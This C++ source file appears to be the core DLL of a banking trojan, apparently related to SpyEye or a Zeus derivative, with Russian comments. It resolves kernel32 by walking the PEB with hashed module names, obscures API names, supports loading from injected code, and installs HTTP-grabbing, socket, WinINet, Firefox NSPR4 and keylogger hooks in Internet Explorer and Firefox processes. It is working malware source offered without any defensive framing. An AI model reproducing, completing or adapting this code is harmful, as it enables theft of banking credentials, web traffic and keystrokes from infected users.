#include <windows.h>
#include <shlobj.h>
#include <shellapi.h>
#include <sddl.h>
#include <wincrypt.h>
#include <shlwapi.h>
#include <wininet.h>
#include <ws2tcpip.h>
#include <intrin.h> 

#include "defines.h"
#include "DllCore.h"
#include "dllconfig.h"
#include "osenv.h"
#include "winapitables.h"
#include "httpgrabber.h"
#include "nspr4hook.h"
#include "sockethook.h"
#include "wininethook.h"
#include "cryptedstrings.h"
#include "peinfector.h"
#include "userhook.h"
#include "spyeye_modules.h"
#include "report.h"

#include "..\common\mem.h"
#include "..\common\str.h"
#include "..\common\debug.h"
#include "..\common\peimage.h"
#include "..\common\process.h"
#include "..\common\wsocket.h"
#include "..\common\wininet.h"
#include "..\common\disasm.h"
#include "..\common\comlibrary.h"
#include "..\common\wahook.h"
#include "..\common\crypt.h"
#include "..\common\fs.h"

COREDLLDATA coreDllData;

static DWORD WINAPI newThreadEntryPoint(void* p)
{
	DllCore::coreStart((HMODULE)p);
	return 0;
}

/*
	Аналог CWA(kernel32, GetProcAddress).
*/
void *DllCore::__GetProcAddress(HMODULE module, LPSTR name)
{
#if defined _WIN64
	PIMAGE_NT_HEADERS64 ntHeaders  = (PIMAGE_NT_HEADERS64)((LPBYTE)module + ((PIMAGE_DOS_HEADER)module)->e_lfanew);
#else
	PIMAGE_NT_HEADERS32 ntHeaders  = (PIMAGE_NT_HEADERS32)((LPBYTE)module + ((PIMAGE_DOS_HEADER)module)->e_lfanew);
#endif
	PIMAGE_DATA_DIRECTORY impDir = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
	PIMAGE_EXPORT_DIRECTORY ied =  (PIMAGE_EXPORT_DIRECTORY)((LPBYTE)module + impDir->VirtualAddress);

	for(DWORD i = 0; i < ied->NumberOfNames; i++)
	{
		LPDWORD curName = (LPDWORD)(((LPBYTE)module) + ied->AddressOfNames + i * sizeof(DWORD));
		if(curName && Str::_CompareA(name, (LPSTR)((LPBYTE)module + *curName), -1, -1) == 0)
		{
			LPWORD pw = (LPWORD)(((LPBYTE)module) + ied->AddressOfNameOrdinals + i * sizeof(WORD));
			curName = (LPDWORD)(((LPBYTE)module) + ied->AddressOfFunctions + (*pw) * sizeof(DWORD));
			return ((LPBYTE)module + *curName);
		}
	}

	return NULL;
}

typedef struct _PEB_LDR_DATA {
  BYTE       Reserved1[8];
  PVOID      Reserved2[3];
  LIST_ENTRY* InMemoryOrderModuleList;
} PEB_LDR_DATA, *PPEB_LDR_DATA;

#ifdef _WIN64
typedef struct _PEB {
    BYTE Reserved1[2];
    BYTE BeingDebugged;
    BYTE Reserved2[21];
    PPEB_LDR_DATA Ldr;
} PEB;
#else

typedef struct _PEB
{
	/*0x000*/     UINT8        InheritedAddressSpace;
	/*0x001*/     UINT8        ReadImageFileExecOptions;
	/*0x002*/     UINT8        BeingDebugged;
	/*0x003*/     UINT8        SpareBool;
	/*0x004*/     VOID*        Mutant;
	/*0x008*/     VOID*        ImageBaseAddress;
	/*0x00C*/     struct _PEB_LDR_DATA* Ldr;
	/*.....*/
} PEB;

#endif

/*
	Получение хэндла kernel32.dll.

	Return - хэндл.
*/
static HMODULE _getKernel32Handle(void)
{
	HMODULE dwResult = NULL;
	PEB *lpPEB = NULL;
	SIZE_T *lpFirstModule = NULL;

#if defined _WIN64
	lpPEB = *(PEB **)(__readgsqword(0x30) + 0x60); //get a pointer to the PEB
#else
	lpPEB = *(PEB **)(__readfsdword(0x18) + 0x30); //get a pointer to the PEB
#endif
	
	// PEB->Ldr->LdrInMemoryOrderModuleList
	// PEB->Ldr = 0x0C
	// Ldr->LdrInMemoryOrderModuleList = 0x14
	lpFirstModule = (SIZE_T *)lpPEB->Ldr->InMemoryOrderModuleList;  

	SIZE_T *lpCurrModule = lpFirstModule;
	do
	{
		PWCHAR szwModuleName = (PWCHAR)lpCurrModule[10]; // 0x28 - module name in unicode

		DWORD i = 0;
		DWORD dwHash = 0;
		while(szwModuleName[i])
		{
			BYTE zByte = (BYTE)szwModuleName[i];
			if (zByte >= 'a' && zByte <= 'z') 
				zByte -= 0x20; // Uppercase
			dwHash = ROR(dwHash, 13) + zByte;
			i++;
		}

		if ((dwHash ^ RAND_DWORD1) == (0x6E2BCA17 ^ RAND_DWORD1)) // KERNEL32.DLL hash
		{
			dwResult = (HMODULE)lpCurrModule[4];
			return dwResult;
		}
		lpCurrModule = (SIZE_T*)lpCurrModule[0];	// next module in linked list
	} while (lpFirstModule != (SIZE_T*)lpCurrModule[0]);

	return dwResult;
}

/*
Установка хуков.

Return   - true - в случаи успеха,
false - в случаи ошибки.
*/
static bool __inline initHooks(DWORD flags)
{
	HttpGrabber::init();
#if BO_KEYLOGGER > 0
	UserHook::init();
#endif
	SocketHook::init();

	WinApiTables::_setSocketHooks();

	if (flags & DllCore::PROCESS_IE)
	{
		WininetHook::init();
		if(WinApiTables::_setUserHooks() 
#if BO_KEYLOGGER > 0
			&& WinApiTables::_setKeyloggerHooks()
#endif
			)
		{
			WDEBUG0(WDDT_INFO, "Hooks installed for iexplore.exe");
		}
	}
	else if (flags & DllCore::PROCESS_FIREFOX)
	{
		if(WinApiTables::_trySetNspr4Hooks() 
#if BO_KEYLOGGER > 0
			&& WinApiTables::_setKeyloggerHooks()
#endif
			)
		{
			WDEBUG0(WDDT_INFO, "Hooks installed for nspr4.dll");
		}
	}


	return true;
}

/*
Установка хуков.

Return   - true - в случаи успеха,
false - в случаи ошибки.
*/
static bool __inline unInitHooks(DWORD flags)
{
	HttpGrabber::uninit();
#if BO_KEYLOGGER > 0
	UserHook::uninit();
#endif
	SocketHook::uninit();

	WinApiTables::_removeSocketHooks();

	if (flags & DllCore::PROCESS_IE)
	{
		WininetHook::uninit();
		if(WinApiTables::_removeUserHooks() 
#if BO_KEYLOGGER > 0
			&& WinApiTables::_removeKeyloggerHooks()
#endif
			)
		{
			WDEBUG0(WDDT_INFO, "iexplore.exe hooks uninstalled.");
		}
	}
	else if (flags & DllCore::PROCESS_FIREFOX)
	{
		if(WinApiTables::_removeNspr4Hooks() 
#if BO_KEYLOGGER > 0
			&& WinApiTables::_removeKeyloggerHooks()
#endif
			)
		{
			WDEBUG0(WDDT_INFO, "nspr4.dll hooks uninstalled.");
		}
	}

	return true;
}

/*
	Основне данные OS.

	Return   - true - в случаи успеха,
	false - в случаи ошибки.
*/
static bool __inline initOsBasic(void)
{
	//Версия Windows.
	{
		coreDllData.winVersion = OsEnv::_getVersion();
		if(coreDllData.winVersion < OsEnv::VERSION_XP)
		{
			WDEBUG1(WDDT_ERROR, "Bad windows version %u.", coreDllData.winVersion);
			return false;
		}
	}

	//CompId
	{
		OsEnv::_generateBotId(coreDllData.compId);
	}

	//Получение IntegrityLevel.
	if((coreDllData.integrityLevel = Process::_getIntegrityLevel(CURRENT_PROCESS)) == Process::INTEGRITY_UNKNOWN)
	{
		if(coreDllData.winVersion < OsEnv::VERSION_VISTA)
			coreDllData.integrityLevel = Process::INTEGRITY_MEDIUM;
		else
		{
			WDEBUG0(WDDT_ERROR, "Unknown integrity level.");
			return false;
		}
	}

	return true;
}

/*
	Создание объектов.

	Return   - true - в случаи успеха,
	false - в случаи ошибки.
*/
static bool initHandles(void)
{
	//Глобальные объекты.
	coreDllData.stopEvent = CWA(kernel32, CreateEventW)(0, TRUE, FALSE, NULL);

	if(coreDllData.stopEvent == NULL)
	{
		WDEBUG0(WDDT_ERROR, "Failed to create global handles.");
		return false;
	}

	return true;
}


bool DllCore::init(HMODULE module, DWORD flags)
{
#if BO_DEBUG > 0
	DebugClient::Init();
	DebugClient::RegisterExceptionFilter();
#endif
	coreDllData.modules.currentModule = module;
	coreDllData.pid = GetCurrentProcessId();
	
	//Основные данные OC.
	if(!initOsBasic())
		return false;

	//Объекты.
	if(!initHandles())
		return false;

	coreDllData.currentConfig = DllConfig::getCurrent();

	//Установка хуков.
	if(!initHooks(flags))
		return false;

	SpyEye_Modules::init();

	CWA(kernel32, DisableThreadLibraryCalls)(module);

	return true;
}

void DllCore::uninit(void)
{
	if (coreDllData.stopEvent)
	{
		CWA(kernel32, SetEvent)(coreDllData.stopEvent);
		CWA(kernel32, CloseHandle)(coreDllData.stopEvent);
		unInitHooks(coreDllData.flags);
		Mem::free(coreDllData.currentConfig);
		Mem::uninit();
		Crypt::uninit();
	}
}

void DllCore::initHttpUserAgent(void)
{
	if(coreDllData.httpUserAgent == NULL)
	{
		coreDllData.httpUserAgent = Wininet::_GetIEUserAgent();
	}
}

bool DllCore::isActive(void)
{
	return CWA(kernel32, WaitForSingleObject)(coreDllData.stopEvent, 0) == WAIT_OBJECT_0 ? false : true;
	//return true;
}

bool DllCore::coreStart(HMODULE module)
{
	bool result = false;
	LPWSTR lpProcessName;

	if (CWA(kernel32, GetModuleFileNameW)(NULL, coreDllData.currentProcessPath, sizeof(coreDllData.currentProcessPath)))
	{
		lpProcessName = CWA(Shlwapi, PathFindFileNameW)(coreDllData.currentProcessPath);
		
		coreDllData.flags = 0;
		if (CSTR_EQNIW(lpProcessName, CryptedStrings::len_dllcore_iexplore - 1, dllcore_iexplore))
		{
			coreDllData.flags = DllCore::PROCESS_IE;
			result = true;
		}
		else if (CSTR_EQNIW(lpProcessName, CryptedStrings::len_dllcore_firefox - 1, dllcore_firefox))
		{
			coreDllData.flags = DllCore::PROCESS_FIREFOX;
			result = true;
		}
		else if (CSTR_EQNIW(lpProcessName, CryptedStrings::len_dllcore_explorer - 1, dllcore_explorer))
		{
			coreDllData.flags = DllCore::PROCESS_EXPLORER;
			result = true;
		}
		else
		{
			coreDllData.flags = DllCore::PROCESS_UNKNOWN;
			result = true;
		}

		if (result)
			result = DllCore::init(module, coreDllData.flags);

	}
	
	return result;
}

void DllCore::bootStrap(HMODULE module, bool runnedFromInjectedCode = false)
{
	HMODULE kernel32 = _getKernel32Handle();
	if(kernel32 == NULL) return;
	
	void* loadlibrarya = 0; void* getprocaddress = 0;

	{
		char loadlib[] = {'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'A', 0};
		char getproc[] = {'G', 'e', 't', 'P', 'r', 'o', 'c', 'A', 'd', 'd', 'r', 'e', 's', 's', 0};
		loadlibrarya = __GetProcAddress(kernel32, loadlib);
		getprocaddress = __GetProcAddress(kernel32, getproc);
	}

	if(runnedFromInjectedCode)
	{
		PeImage::_loadImport(module, loadlibrarya, getprocaddress);
		PeImage::normalizeRelocs(module, (void*)(getImageBase(module)), module);
	}
	
	{
		coreDllData.modules.currentModule = module;
		coreDllData.modules.kernel32 = kernel32;
		coreDllData.winapi.pLoadLibraryA = loadlibrarya;
		coreDllData.winapi.pGetProcAddress = getprocaddress;
	}

	// Should be initalizated here
	Mem::init(512 * 1024);
	Crypt::init();

	if(runnedFromInjectedCode)
	{
		CWA(kernel32, CreateThread)(0, 0, newThreadEntryPoint, module, 0, 0);
	}
	else
	{
		DllCore::coreStart(module);
	}
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
	
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		DllCore::bootStrap(hModule, false);
		return true;
	case DLL_PROCESS_DETACH:
		DllCore::uninit();
		break;
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
		break;
	}
	return TRUE;
}